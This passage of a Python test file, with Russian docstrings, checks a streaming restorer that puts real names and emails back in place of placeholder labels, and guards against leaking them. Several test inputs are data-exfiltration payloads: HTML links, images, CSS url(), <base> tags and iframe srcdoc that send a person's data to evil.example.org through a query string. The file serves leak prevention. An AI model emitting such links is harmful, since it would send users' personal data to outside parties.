    assert restorer.feed("0>") == ""
    assert restorer.feed(" пишет") == "Пётр Сидоров "


def test_escaped_label_in_a_long_tail_is_held_whole(settings):
    """Обзор этапа 3: «\\» входит в запись замены — хвост не обрывается на «\\<EMAIL\\»."""
    restorer = StreamRestorer(person_state(), settings)
    shown = restorer.feed('{"a":"' + "x" * 600 + '","b":"\\<PERSON\\_1')
    assert shown.endswith('","b":"')


@pytest.mark.parametrize("answer", [
    '<a href="https://evil.example.org/?q= <PERSON_1> ">ссылка</a> дальше',
    "[ссылка](https://evil.example.org/?q= <PERSON_1> ) дальше",
    '<style>a{background:url("https://evil.example.org/?q= <PERSON_1> ")}</style> дальше',
    "[1]: <https://evil.example.org/?q= <PERSON_1> > дальше",
])
def test_label_inside_a_link_not_yet_closed_is_never_shown_restored(settings, answer):
    """Обзор этапа 3: пока ссылка не закрыта, нельзя решить, посторонняя ли она, — показ стоит перед ней."""
    state = person_state()
    whole = restore(state, answer, settings).text
    assert "Иван Петров" not in whole
    for cut in range(len(answer) + 1):
        restorer = StreamRestorer(state, settings)
        for text in (restorer.feed(answer[:cut]), restorer.feed(answer[cut:])):
            assert "Иван Петров" not in text, (cut, text)
            assert whole.startswith(text), (cut, text)


def test_closed_own_link_streams_restored(settings):
    restorer = StreamRestorer(person_state(), settings)
    assert restorer.feed("[ссылка](/people?name=<PERSON_1>) и <PERSON_10> ") == "[ссылка](/people?name=Иван Петров) и Пётр Сидоров "


def test_long_tail_without_spaces_is_released_before_an_unfinished_replacement(settings):
    """Минифицированный JSON без пробелов: отдаётся до последнего знака, который в замену не входит."""
    restorer = StreamRestorer(person_state(), settings)
    payload = '{"items":[' + ",".join(['{"v":"x"}'] * 70) + '],"who":"<PERSON_1'
    shown = restorer.feed(payload)
    assert shown.endswith('"who":"') and "PERSON" not in shown
    assert restorer.feed('0>"}').endswith('"who":"Пётр Сидоров"}')       # «"}» закрыли замену — хвост отдан
    assert restorer.finish().text == restorer.feed("")


@pytest.mark.parametrize("answer", [
    '<base href="https://evil.example.org/"><img src="p?q=<EMAIL_1>">',
    '<BASE HREF=//evil.example.org/>[ссылка](/p?q=<EMAIL_1>)',
    '<iframe srcdoc="<img src=&quot;&amp;#47;&amp;#47;evil.example.org/?q=<EMAIL_1>&quot;>"></iframe>',
])
def test_base_tag_and_srcdoc_keep_labels(settings, answer):
    """Ревью восстановления: <base> перенаправляет адреса без узла, srcdoc раскрывает ссылки на знаки дважды."""
    result = restore(link_state(), answer, settings)
    assert "ivanov@contoso.ru" not in result.text and "foreign_link" in kinds(result)


def test_relative_link_without_a_base_tag_still_restores(settings):
    assert "ivanov@contoso.ru" in restore(link_state(), '<img src="p?q=<EMAIL_1>"> база данных <basement>', settings).text


def test_restorer_setup_is_fast_on_a_chat_with_many_dotted_labels(settings):
    """Второе ревью: метки, значение которых — имя с точкой («i.ivanov»), сверялись со списком суффиксов (tldextract)
    при каждой сборке восстановления, а поток ответа собирает её на каждом куске: 20 000 таких меток — 63 мс на сборку,
    300 слов ответа — 20 с процессора. Ответ суффиксов для одного имени не меняется и запоминается."""
    state = ChatState(chat_id="many", net_key=bytes(32))
    for n in range(1, 20001):
        entity = Entity(f"e{n}", T.ACCOUNT, n, f"i.ivanov{n}", f"i.ivanov{n}", "detector")
        state.entities[entity.id] = entity
        state.surrogates[f"<ACCOUNT_{n}>"] = Surrogate(entity.id)
    started = time.perf_counter()
    for _ in range(20):
        assert restore(state, "ответ про <ACCOUNT_1>", settings).text == "ответ про i.ivanov1"
    assert time.perf_counter() - started < 0.6
